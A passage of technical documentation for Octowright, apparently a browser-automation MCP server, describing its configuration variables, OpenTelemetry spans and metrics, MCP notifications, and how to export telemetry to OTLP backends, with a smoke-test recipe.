  **ON by default**; `=0` disables. Headless is never auto-protected.
  Outranked by `OCTOWRIGHT_PROTECT_BROWSERS=1` (protect all). Parser/const:
  `defaults.PROTECT_HEADED_DEFAULT`; resolver `browser_pool.options.resolve_protected`.
- `OCTOWRIGHT_HEADED_LAUNCH_CONCURRENCY` — how many **headed** browsers
  `spawn_roster` may launch at the same instant (**default 3**), via a per-call
  `asyncio.Semaphore`. A big headed roster/scenario now starts in batches rather
  than firing every window creation simultaneously; **headless is never
  throttled** (`headed is False` bypasses the gate entirely, and `headed=None`
  resolves headed-by-default so it goes through it). Explicitly **defensive
  hardening, NOT a proven crash fix** — characterisation of the recurring
  headed-Chromium crash reproduced it through rapid *sequential* `browser_launch`
  churn, and concurrent `spawn_roster` launches did *not* reproduce it; bounding
  simultaneous window creation is merely prudent, since window-server/GPU pressure
  scales with it. The exact churn trigger is still under investigation. An
  unparsable value falls back to the default; the floor is 1 (a non-positive value
  would deadlock). Parser/const: `browser_pool.limits.headed_launch_concurrency` /
  `HEADED_LAUNCH_CONCURRENCY_DEFAULT`.
- `OCTOWRIGHT_OPERATION_QUEUE_TIMEOUT_SECONDS` — FIFO admission timeout for the
  per-session **Browser Session Operation Gate** (see above). **Default `300`**;
  must parse as positive, finite seconds or the pool/gate fails to configure.
  `BrowserPool(operation_queue_timeout_seconds=...)` takes precedence over the
  env var, which takes precedence over the default. Bounds only the queue wait
  before an operation is admitted — a separate concern from any Playwright
  action/navigation/expect timeout, and no automatic retries are added.
  Close coordinators and crash recovery are durable system operations and do
  not use this timeout. Parser/resolver:
  `session.operation_gate.resolve_operation_queue_timeout_seconds`.
- `OCTOWRIGHT_DASHBOARD_OPERATION_TIMEOUT_SECONDS` — separate, much shorter gate
  wait budget for best-effort **dashboard reads** (session-detail aria capture,
  live screenshot, selector validate) that touch a session's operation gate.
  **Default `8.0`** seconds; a non-positive/unparsable value falls back to the
  default rather than going unbounded. An MCP tool call still inherits the
  gate's own `OCTOWRIGHT_OPERATION_QUEUE_TIMEOUT_SECONDS` (300s default) because
  an agent is willing to wait out a real in-flight action, whereas a human
  staring at the dashboard needs a fast, legible failure instead of an
  unexplained multi-minute stall. Parser: `http/routes/_common._dashboard_operation_timeout_seconds`.

## Telemetry (OpenTelemetry)

Tracing and metrics are emitted via `provide.telemetry`. Logs are always structured; spans and metrics are emitted ONLY when explicitly enabled — the noop tracer/meter is the default so there's no cost when not in use. Exports use OTLP, so any OTel-compatible backend works: an OTel Collector that fans out to LGTM/Tempo, OpenObserve, Honeycomb, Datadog (OTLP), Jaeger, Grafana Cloud, SigNoz, etc. The codebase does not name a specific backend.

### Spans

Span names follow the `octowright.<area>.<verb>` convention. The list below is alphabetized for stability — order has no semantic meaning. Per-span attributes vary; only the attributes actually set at the span call site are listed (callers may add more via `set_attrs` mid-span).

| Span | Attributes | Emitted by |
|------|------------|------------|
| `octowright.artifact.verify` | `artifact_type`, `name`, `critical_points`, `run_id` | `artifacts/verification.py` |
| `octowright.artifact.verify.check` | `artifact_type`, `check_type` | `artifacts/verification.py` |
| `octowright.bridge.forward_rpc` | `method`, `request_id` | `proxy_supervisor.forward_rpc` (follower leg) |
| `octowright.browser.handoff` | `old_instance_id`, `kind`, `headed`, `close_original`, `accept_stateless` | `browser_pool/lifecycle.handoff_browser` |
| `octowright.browser.launch` | `kind` | `browser_pool/_metrics.launch_span` (wraps `pool.launch`) |
| `octowright.browser.relaunch_fluid` | `instance_id`, `kind` | `browser_pool/pool.relaunch_fluid` |
| `octowright.browser.spawn_roster` | `roster_size` | `browser_pool/roster.browser_spawn_roster` |
| `octowright.macro.action` | `action`, `instance_id` | `macros/runtime.dispatch_simple` |
| `octowright.macro.artifact.run` | `macro`, `run_id`, `verify` | `macros/artifacts.py` |
| `octowright.macro.run` | `macro`, `instance_id`, `kind` | `macros/execution.run_macro` |
| `octowright.macro.run_sequence` | `names_count`, `stop_on_failure` | `macros/execution.run_sequence` |
| `octowright.mcp.request` | `method`, `path` | `_trace_propagation.TraceContextExtractionMiddleware` (leader leg, ends on `http.response.start`) |
| `octowright.scenario.run_macro` | `scenario_id`, `macro`, `role`, `targeted` | `scenarios_pool.ScenarioPool.run_macro` |
| `octowright.scenario.start` | `scenario_id`, `scenario_name`, `participants` | `scenarios_pool.ScenarioPool.start` |
| `octowright.session.close` | `instance_id`, `kind` | `session/core_ops_mixin.SessionOpsMixin.close` |
| `octowright.session.navigate` | `instance_id`, `kind`, `url` | `session/core_page_mixin.SessionPageMixin.navigate` |
| `octowright.terminal.close` | `connector_type`, `instance_id` | `terminal/engine.TerminalEngine.stop` *(optional extra)* |
| `octowright.terminal.launch` | `connector_type`, `instance_id` | `terminal/engine.TerminalEngine.start` *(optional extra)* |
| `octowright.terminal.send_input` | `connector_type`, `instance_id` | `terminal/engine.TerminalEngine.send_input` *(optional extra)* |

`macro.action` spans nest under their `macro.run` parent, which (when invoked from `macro_run_sequence`) nests under `macro.run_sequence`, so a multi-step macro run renders as a clean tree.

The `url` attribute on `octowright.session.navigate` is run through `_sanitize_url_for_span` before it is stamped: it strips the query string *and* any `user:pass@` basic-auth userinfo (preserving `host:port` verbatim by dropping everything up to the last `@` in the netloc), so navigation tokens and cleartext credentials don't reach traces / exporter backends. The full URL still flows to `self.url` and the recorder's `navigate` event — only the span attribute is sanitized.

### Trace context propagation across the bridge

The follower→leader chain is glued together by the W3C `traceparent` header. On the follower side, `proxy_supervisor.forward_rpc` opens its `octowright.bridge.forward_rpc` span and hands the underlying MCP `streamablehttp_client` an httpx factory from `_trace_propagation.tracing_httpx_client_factory`; that factory registers a per-request hook (`_inject_traceparent_hook`) that calls the OTel propagator to inject `traceparent` (and `tracestate`) into every outgoing HTTP request. On the leader side, `_trace_propagation.TraceContextExtractionMiddleware` runs as ASGI middleware in front of the HTTP-MCP app: it extracts the propagated context from request headers, attaches it via `opentelemetry.context.attach`, then opens the per-request `octowright.mcp.request` span. Any spans started while the leader handles the request — including spans inside `@mcp.tool` handlers like `browser.launch` or `macro.run` — chain under the follower's `bridge.forward_rpc` span. The `mcp.request` span ends as soon as `http.response.start` is sent (not on body completion) to avoid filling the OTel batch-exporter buffer with long-lived SSE streams.

### Metrics

| Instrument | Type | Labels | Description |
|------------|------|--------|-------------|
| `octowright_browser_launched_total` | counter | `kind` | Browsers launched (recorded after registration). |
| `octowright_browser_closed_total` | counter | `kind` | Browser sessions closed cleanly via `session.close()`. |
| `octowright_browser_launch_failed_total` | counter | `kind`, `error` | Failed launches. `error` is the exception class name. |
| `octowright_browser_evicted_total` | counter | `kind` | Browsers removed from the pool by an external close signal (not `pool.close`). |
| `octowright_terminal_launched_total` | counter | `connector_type` | Terminal sessions launched (after a successful `engine.start()`). *(optional extra)* |
| `octowright_terminal_closed_total` | counter | `connector_type` | Terminal sessions ended — counted once per session in `_record_stop`, whichever path got there first (explicit close or poll-loop EOF). *(optional extra)* |
| `octowright_macro_run_total` | counter | `macro`, `status` | Macro runs (`status` is `ok`/`failed`). |
| `octowright_bridge_reconnect_total` | counter | `reason` | Times the follower bridge reconnected to the leader. |
| `octowright_bridge_rpc_total` | counter | `method` | JSON-RPC messages forwarded local→remote. |
| `octowright_bridge_resume_total` | counter | — | In-flight requests re-sent to the leader after a reconnect (idempotent resume). |
| `octowright_bridge_suspension_total` | counter | — | Follower-process suspensions detected by the deadline watchdog (a client froze the follower, e.g. an MCP-client compaction SIGSTOP). |
| `octowright_browser_crashed_total` | counter | `kind` | Renderer crashes observed (`page.on("crash")`). |
| `octowright_browser_crash_recovered_total` | counter | `kind` | Renderer crashes auto-recovered by replacing the dead page. |
| `octowright_browser_crash_recovery_failed_total` | counter | `kind` | Auto-recovery attempts whose page replacement failed. |
| `octowright_driver_restart_total` | counter | — | Shared Playwright driver deaths rebuilt mid-run (the SPOF signal). |
| `octowright_driver_lost_total` | counter | `outcome`, `kind` | Sessions lost when the shared driver died (`outcome` = `surfaced`/`relaunched`). |
| `octowright_launch_refused_total` | counter | `reason` | User-facing launches refused (`reason` = `cap`/`memory`). |
| `octowright_orphan_reaped_total` | counter | `scope` | Orphaned (dead-driver) browser processes killed by the reaper. |
| `octowright_follower_session_reaped_total` | counter | — | Leader MCP sessions terminated by the housekeeping pid-liveness reaper (job 3) because their follower's OS process was found dead. Process-lifetime running total also readable in-process via `octowright_status()["bridge"]["follower_sessions_reaped"]`. |
| `octowright_mcp_new_session_throttled_total` | counter | — | Session-creating `/mcp` requests rejected with `429` by the leader-side per-source new-session rate limit (`OCTOWRIGHT_MCP_NEW_SESSION_MAX`). A high value means a follower is storming — reconnecting/creating sessions far faster than legit use. |
| `octowright_mcp_session_evicted_total` | counter | — | Leader MCP sessions evicted by housekeeping because the live table exceeded `OCTOWRIGHT_MCP_MAX_SESSIONS` (the version-agnostic memory bound against a session storm). |
| `octowright_bridge_leader_recovery_total` | counter | `outcome` | Leader-down gaps (`outcome` = `recovered`/`exhausted`) — how often a leader restart is survived vs. drops the client. |
| `octowright_artifact_verify_total` | counter | — | Macro-artifact verification runs. |
| `octowright_artifact_verify_check_total` | counter | — | Per-check results within a macro-artifact verification. |
| `octowright_macro_artifact_run_total` | counter | — | Macro-artifact replay runs. |
| `octowright_process_rss_bytes` | histogram (By) | `scope` | Resident memory of the leader + its browsers, sampled each housekeeping cycle (`scope` = `leader`/`browsers`/`total`) — the continuous multi-day leak signal. |
| `octowright_browser_launch_duration_seconds` | histogram (s) | `kind` | Time from `pool.launch()` entry to registered session. |
| `octowright_macro_run_duration_seconds` | histogram (s) | `macro` | `run_macro` elapsed time including nested actions. |
| `octowright_session_navigate_duration_seconds` | histogram (s) | `kind` | Duration of `session.navigate()` including `page.goto`. |
| `octowright_bridge_rpc_duration_seconds` | histogram (s) | `method`, `outcome` | End-to-end follower→leader→follower RPC latency. |
| `octowright_operation_queue_wait_seconds` | histogram (s) | `operation`, `kind`, `outcome` | Time an operation spent in the per-session FIFO queue before admission (`outcome` = `admitted`/`timeout`/`cancelled`). See **Browser Session Operation Gate**. |
| `octowright_operation_active_duration_seconds` | histogram (s) | `operation`, `kind`, `outcome` | Time an admitted operation held the gate (`outcome` = `ok`/`error`/`cancelled`). |
| `octowright_operation_queue_timeout_total` | counter | `operation`, `kind` | FIFO tickets that expired before admission (`SessionBusyTimeoutError`). |
| `octowright_operation_rejected_total` | counter | `operation`, `kind`, `reason` | Operations rejected outright because the gate was not open (`reason` is the gate state or close/invariant cause, e.g. `closing`/`closed`/`broken`/`external_close`/`session_closed`). |
| `octowright_operation_queue_depth` | gauge (1) | `kind` | Current FIFO queue depth, aggregated per browser `kind` (not per session or per operation). |

The `macro` label is capped at `OCTOWRIGHT_METRICS_MACRO_LABEL_CAP` distinct values (default 256); beyond the cap, names land in an `(overflow)` bucket so long-lived deployments don't unbound their time-series count. The `error` and `method` labels are intrinsically bounded by code paths; `kind` is bounded to the three browser engines plus `unknown`; `connector_type` is bounded to `pty`/`ssh`/`telnet`. `octowright_status()["metrics"]` surfaces `macro_labels_seen` and `macro_label_overflow_count` so an operator can see when dynamic macro names (e.g. `migrate-table-{uuid}`) have saturated the cap. The recovery escape hatch is `octowright.macros.execution.reset_macro_label_seen()` — in-process only (not exposed as an MCP tool, by design) for tests or operator process access.

There is intentionally no counter for the ws-cache batched flush — the flush is purely a transport optimization and its frequency is not a useful operational signal.

### MCP notifications (proactive, LLM-facing)

Octowright builds JSON-RPC notifications for exceptional situations from `browser_pool` session-event-bus events (`server/mcp_notifications.notification_payload` / `_build_notification`) and delivers them over TWO paths so a client gets them regardless of transport: (1) **stdio** — the emitter (`run_with_notifications`) writes to the stdio server, used when the leader runs inline (`--no-singleton`); (2) **follower bridge** — the leader streams the event bus over the `GET /api/mcp-events` SSE endpoint (`http/routes/mcp_events.py`), and the follower's `proxy_runtime.consume_leader_notifications` re-injects each frame (rebuilt via `payload_to_message`) into the local stdio client write. Path (2) closes the daemon-mode gap: the HTTP-MCP transport the detached-daemon leader serves has no server-initiated-notification path of its own, so without it a stdio-client-through-follower (the normal deployment) would never see crash/driver/close notifications. The leader's own stdio emitter writes to the detached daemon's clientless stdout, so there is no double-delivery. A **direct** HTTP-MCP client that bypasses the follower still gets no push (SDK limitation) — so the LLM should still treat `octowright_status()` (health / crash.recent / pool.lost_sessions) as the authoritative check and notifications as best-effort. Covered end-to-end by `tests/test_mcp_events_daemon_live.py` (via-follower delivery) and `tests/test_mcp_notifications_daemon_live.py` (direct-client boundary).

| Method | Fires when | Key params |
|--------|-----------|------------|
| `notifications/octowright/browser_crashed` | a renderer crash is observed (`page.on("crash")`) | `recovering` (auto-recovery scheduled → WAIT for `browser_recovered`, don't relaunch), `scope`, `hint` |
| `notifications/octowright/browser_recovered` | a renderer-crash recovery resolved | `outcome` (`recovered` = usable again, continue / `failed` / `exhausted` = relaunch), `attempts`, `hint` |
| `notifications/octowright/driver_died` | the shared driver died and sessions were lost | `lost_instance_ids`, `relaunch_mode`, `restart_count`, `hint` (points at `octowright_status().pool.lost_sessions`) |
| `notifications/octowright/session_closed` | a session left the pool | `reason` (`agent_close`/`user_close`/`external_disconnect`/`crashed`/`shutdown`) |

The MCP server `instructions` string (`server/_state.py`) summarizes this taxonomy so the LLM knows the signals exist; refused launches surface in-band as actionable tool errors (cap / memory floor), not notifications.

### Session log context

Spans are the canonical way to attach session identity to telemetry: span attributes (`instance_id`, `kind`, etc.) are recorded on the span object itself and travel with it regardless of which asyncio task started the span. Anything that needs to chain across tool calls — traces, metrics with `kind=` labels, propagated context across the bridge — relies on the span path, not on log context.

For structured logs, every tool-handler log call passes `instance_id=` explicitly as a keyword (`log.info("session.navigate", instance_id=..., url=...)` style). There is no global contextvar binding that fills it in for you; if a new log site wants the per-session identifiers, it must pass them as kwargs.

### Enabling export

Two env vars turn things on; the OTLP endpoint vars are the standard OpenTelemetry ones (`OTEL_EXPORTER_OTLP_*`), so any backend that speaks OTLP is wired the same way:

```bash
# Required: turn on tracing + metrics. Both default off.
export PROVIDE_TRACE_ENABLED=true
export PROVIDE_METRICS_ENABLED=true

# Optional — service name defaults to "octowright".
# export PROVIDE_TELEMETRY_SERVICE_NAME=octowright-dev

# Point at your backend. Either set the per-signal vars explicitly:
export OTEL_EXPORTER_OTLP_TRACES_ENDPOINT=https://<host>/v1/traces
export OTEL_EXPORTER_OTLP_METRICS_ENDPOINT=https://<host>/v1/metrics
export OTEL_EXPORTER_OTLP_LOGS_ENDPOINT=https://<host>/v1/logs
# …or set one root and let the SDK append /v1/<signal>:
# export OTEL_EXPORTER_OTLP_ENDPOINT=https://<host>

# Auth (if your backend requires it):
# export OTEL_EXPORTER_OTLP_HEADERS="Authorization=Basic <base64-user:pass>"
# or, vendor-specific:
# export OTEL_EXPORTER_OTLP_HEADERS="api-key=<token>"

uv run octowright serve
```

The OTel SDK is pulled in as an extra (`provide-telemetry[otel]`); without it (or without `PROVIDE_TRACE_ENABLED=true`), the tracer/meter are noops and the cost is one cached attribute lookup per span entry — safe to leave the instrumentation in place.

#### Backend-specific notes

**Local OTel Collector (gRPC 4317 / HTTP 4318)** — most LGTM stacks (Loki + Grafana + Tempo + Mimir/Prometheus + Pyroscope) and any "agent-in-the-middle" deployment land here. The collector fans out to whatever backends it's configured with; from octowright's perspective it's the only URL you care about:

```bash
export OTEL_EXPORTER_OTLP_ENDPOINT=http://localhost:4318
export OTEL_EXPORTER_OTLP_PROTOCOL=http/protobuf
```

**OpenObserve (direct ingestion)** — exposes per-stream paths under `/api/<org>/v1/<signal>`:

```bash
export OTEL_EXPORTER_OTLP_TRACES_ENDPOINT=http://localhost:5080/api/default/v1/traces
export OTEL_EXPORTER_OTLP_METRICS_ENDPOINT=http://localhost:5080/api/default/v1/metrics
export OTEL_EXPORTER_OTLP_LOGS_ENDPOINT=http://localhost:5080/api/default/v1/logs
```

**Honeycomb / Grafana Cloud / SigNoz / similar SaaS** — same `OTEL_EXPORTER_OTLP_*` vars; auth goes in `OTEL_EXPORTER_OTLP_HEADERS`.

#### Smoke-test recipe

End-to-end verification (replace the URL with your backend):

```bash
PROVIDE_TRACE_ENABLED=true PROVIDE_METRICS_ENABLED=true \
PROVIDE_TELEMETRY_SERVICE_NAME=octowright-smoketest \
OTEL_EXPORTER_OTLP_ENDPOINT=http://localhost:4318 \
OTEL_EXPORTER_OTLP_PROTOCOL=http/protobuf \
uv run --active python -c "
from provide.telemetry import setup_telemetry, shutdown_telemetry
from octowright._tracing import span, counter
setup_telemetry()
with span('octowright.browser.launch', kind='chromium'):
    with span('octowright.macro.run', macro='login'):
        pass
counter('octowright_smoketest_total').add(1, attributes={'kind': 'chromium'})
shutdown_telemetry()
print('emitted')
"
```

Then query your backend for `service.name=octowright-smoketest`. The expected span tree is `browser.launch → macro.run`. The counter shows up as `octowright_smoketest_total{service_name="octowright-smoketest", kind="chromium"} = 1`.
